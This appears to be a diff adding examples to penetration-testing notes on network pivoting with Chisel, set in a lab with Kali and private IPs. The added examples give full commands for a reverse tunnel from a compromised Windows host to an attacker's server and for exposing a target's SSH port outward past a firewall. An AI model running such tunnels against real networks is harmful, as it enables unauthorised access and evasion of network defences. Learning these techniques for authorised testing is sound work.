@@ -211,3 +211,55 @@ Attacker Machine     Chisel Client        Target Machine
 localhost:8080        Connection        Internal Service
 ```
 **Use Case:** Target can't reach you directly (firewall blocks incoming)
+
+
+## Example 1
+You have access to a Windows host (pivot)
+
+That Windows host can access an internal server:
+10.10.10.20:80
+
+Your Kali cannot access it directly
+
+#### Step 1: Start server on Kali
+```
+chisel server --reverse -p 9001
+
+```
+
+#### Step 2: Run client on Windows
+```
+chisel.exe client <KALI-IP>:9001 R:8080:10.10.10.20:80
+
+```
+**Meaning:**
+- Kali opens: 127.0.0.1:8080
+- That port forwards to: 10.10.10.20:80 (internal target)
+
+Now you can access internal server from Kali:
+```
+curl http://127.0.0.1:8080
+```
+
+
+
+
+## Example 2: Reverse Shell Access
+
+### Scenario:
+Target has SSH but firewall blocks incoming connections
+```bash
+# Step 1: Start server on Kali (10.10.10.5)
+chisel server --port 9000 --reverse
+
+# Step 2: On target machine (run client)
+chisel client 10.10.10.5:9000 R:2222:localhost:22
+
+# Step 3: SSH to target via your localhost
+ssh user@localhost -p 2222
+```
+
+**Breakdown:**
+- Target connects OUT to your server (allowed by firewall)
+- R:2222:localhost:22 = Reverse forward port 22 to your port 2222
+- You connect to localhost:2222 which reaches target's SSH
